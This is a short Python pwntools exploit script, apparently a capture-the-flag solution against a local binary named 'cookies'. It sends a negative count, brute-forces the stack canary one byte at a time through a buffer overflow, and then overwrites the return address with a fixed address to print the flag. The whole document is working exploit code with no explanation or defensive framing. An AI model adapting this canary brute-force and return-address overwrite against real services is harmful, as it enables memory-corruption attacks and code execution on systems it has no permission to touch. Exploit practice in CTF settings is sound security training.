#!/usr/bin/env python3
from pwn import *
import time

conn = process('./cookies')

# Send the number of cookies we want
conn.recvuntil("How many cookies do you want?")
conn.sendline("-1")

start_payload =  b"A" * 8 + bytes([0])
payload = ""
# Bruteforce the canary value
canary = b""
for i in range(6):
    for c in range(256):
        payload = start_payload + canary + bytes([c])
        print(i+1,"/7",c,"/255:",payload)
        conn.recvuntil("Which" , timeout=3)
        conn.send_raw(payload)
        if not conn.recvuntil("*" , timeout=4):
            canary = canary + bytes([c])
            break
        time.sleep(0.1)

# the final payload
payload = start_payload + canary +  p64(0x4012b6)
print("final payload:\t",payload,"\nfound", i ,"bytes\n")
# Send the final payload and print the flag
conn.sendline(payload)
print(conn.recvall().decode())
